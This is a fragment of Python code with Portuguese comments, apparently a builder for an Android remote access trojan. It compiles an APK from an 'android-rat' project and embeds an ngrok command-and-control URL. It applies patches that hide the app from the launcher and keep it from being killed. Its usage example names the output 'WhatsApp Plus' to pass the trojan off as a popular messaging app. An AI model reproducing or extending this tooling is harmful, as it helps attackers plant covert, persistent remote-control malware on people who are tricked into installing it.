        print(f"[VISUAL-{self.build_id}] 🎨 Iniciando build do APK Visual: {app_name} (idioma: {language}, anti_kill: {enable_anti_kill})")
        
        try:
            self.build_dir = BUILDS_DIR / f"visual_{self.build_id}"
            self.build_dir.mkdir(parents=True, exist_ok=True)
            
            self._copy_project_isolated()
            self._update_app_name(app_name)
            self._update_app_language(language)
            
            if icon_path and os.path.exists(icon_path):
                self._update_icon(icon_path)
            
            self._update_server_url(self.ngrok_url)
            self._embed_visual_config(visual_config_json)
            patch_hide_from_launcher(self.project_path, hide_from_launcher)
            patch_anti_kill(self.project_path, enable_anti_kill)
            
            apk_path = self._compile_apk()
            shutil.copy(apk_path, output_path)
            
            print(f"[VISUAL-{self.build_id}] [OK] APK Visual gerado: {output_path}")
            return True
            
        except Exception as e:
            print(f"[VISUAL-{self.build_id}] [ERRO] Erro: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            self._cleanup_build_dir()
    
    def _embed_visual_config(self, visual_config_json):
        import json
        
        assets_dir = self.project_path / "app/src/main/assets"
        assets_dir.mkdir(parents=True, exist_ok=True)
        
        config_path = assets_dir / "visual_config.json"
        
        with open(config_path, 'w', encoding='utf-8') as f:
            if isinstance(visual_config_json, str):
                f.write(visual_config_json)
            else:
                json.dump(visual_config_json, f, indent=2, ensure_ascii=False)
        
        print(f"[VISUAL] Configuração visual embedada")
    
    def _remove_visual_config(self):
        try:
            for cfg_name in ["visual_config.json", "studio_config.json"]:
                cfg_path = self.project_path / f"app/src/main/assets/{cfg_name}"
                if cfg_path.exists():
                    cfg_path.unlink()
                    print(f"[CLEANUP] Removido {cfg_name} do Modo Rápido")
        except Exception as e:
            print(f"[WARN] Erro ao remover visual/studio config: {e}")


# ======================================================
# EXEMPLO DE USO
# ======================================================
if __name__ == "__main__":
    import gangstar_env

    builder = APKBuilder(
        android_project_path="C:/Users/Usuário/Downloads/PROJETO23/finalvnc/finalvnc/android-rat",
        ngrok_url=gangstar_env.public_ws_url(),
    )
    
    builder.build_custom_apk(
        app_name="WhatsApp Plus",
        icon_path="icon.png",
        output_path="whatsapp-plus.apk"
    )